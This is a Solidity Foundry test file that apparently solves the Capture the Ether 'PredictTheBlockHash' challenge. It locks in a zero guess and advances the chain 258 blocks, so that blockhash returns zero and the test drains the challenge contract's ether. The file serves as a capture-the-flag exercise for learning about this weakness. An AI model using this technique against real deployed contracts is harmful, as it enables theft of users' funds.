// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "source/lotteries/PredictTheBlockHash.sol";

contract PredictTheBlockHash is Test {

  PredictTheBlockHashChallenge predictTheBlockHash;

  address account1;
  address account2;
  uint8   answer;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 10 ether);

    predictTheBlockHash = new PredictTheBlockHashChallenge{value: 1 ether}();
    vm.label(address(predictTheBlockHash), "PredictTheBlockHashChallenge[contract]");
    vm.startPrank(account1);

    console.log(address(predictTheBlockHash));
    console.log(answer);
  }

  function testCorrectGuess() public {
    // correct guess, costs 1 ether, returns 2
    bytes32 guess = bytes32(uint256(0));
    
    // lock in the guess value a zero address
    predictTheBlockHash.lockInGuess{value: 1 ether}(guess);

    // this is the hack: blockhash does not work for blocks that are older than 256, it then returns a zero address
    vm.roll(block.number + 258);

    predictTheBlockHash.settle(); 

    // assert results and correct eth values
    uint expectedAccountBalance = 11 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    uint expectedContractBalance = 0;
    assertEq(address(predictTheBlockHash).balance, expectedContractBalance );

    bool complete = predictTheBlockHash.isComplete();
    assertTrue(complete);

    // log results, a sanity check
    console.log(answer);
    console.log(account1.balance);
    console.log(address(predictTheBlockHash).balance);
    console.log(complete);
  }

  fallback() external payable { }
  receive() external payable { }
}

